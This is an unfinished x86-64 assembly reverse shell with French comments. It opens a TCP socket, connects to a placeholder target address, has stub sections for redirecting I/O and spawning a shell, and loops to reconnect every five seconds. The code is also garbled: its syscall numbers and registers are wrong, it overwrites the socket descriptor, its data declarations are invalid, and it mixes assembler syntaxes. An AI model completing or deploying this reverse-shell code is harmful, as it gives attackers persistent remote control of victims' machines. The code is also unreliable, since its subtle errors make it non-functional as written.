.section .data
    ; Section pour les données initialisées
    TARGET_IP ;ip
    TARGET_PORT ;port

    ;============================
    ; Socket section
    ;============================
    SYSCALL_SOCKET: .int 41
    AF_INET: .int 2
    SOCK_STREAM: .int 1     ;TCP
    IP_PROTOCOL: .int 0
    ;============================
    ; Connect section
    ;============================
    SYSCALL_CONNECT: .int 42
    SIZE_TARGET_IP: .int 16

.section .text
    global _start

; ----------------------------------
; Point d'entrée, fonction principale
; ----------------------------------
_start:

; ----------------------------------
; Appel des fonctions
; ----------------------------------
; ----------------------------------
main:

    call create_socket
    call connect
    call redir_io
    call shell
    call exit
    
; ----------------------------------
; Création de la socket 
; ----------------------------------
create_socket:
    mov rax, SYSCALL_SOCKET
    mov rdi, AF_INET
    mov rsi, SOCK_STREAM
    mov rdx, IP_PROTOCOL
    syscall
; ----------------------------------
; Connexion à la cible 
; ----------------------------------
connect:
    mov rax, SYSCALL_CONNECT
    mov rdi, rax        ; Socket
    mov rsi, TARGET_IP
    mov rdx, TARGET_PORT
    mov r10, SIZE_TARGET_IP
    syscall

; ----------------------------------
; Redirection des entrées/sorties 
; ----------------------------------
redir_io:

; ----------------------------------
; Exécution du shell 
; ----------------------------------
shell:

; ----------------------------------
; Reconnexion auto toute les 5 secondes
; ----------------------------------
reconnect_if_fail:
    ; Si la connexion échoue, attendre 5 secondes
    mov rax, 5          ; Code système pour sleep
    mov rbx, 5          ; Temps d'attente (5 secondes)
    syscall             ; Appelle l'interruption pour dormir

    ; Réessayer de se connecter
    jmp connect         ; Retourne à la fonction de connexion

; ----------------------------------
; Gestion des erreurs
; ----------------------------------
error_handler:

; ----------------------------------
; Sortie 
; ----------------------------------
exit:
    mov rax, 1          ; Code système pour terminer le programme
    mov rbx, 0          ; Code de retour (0)
    syscall             ; Appelle l'interruption pour quitter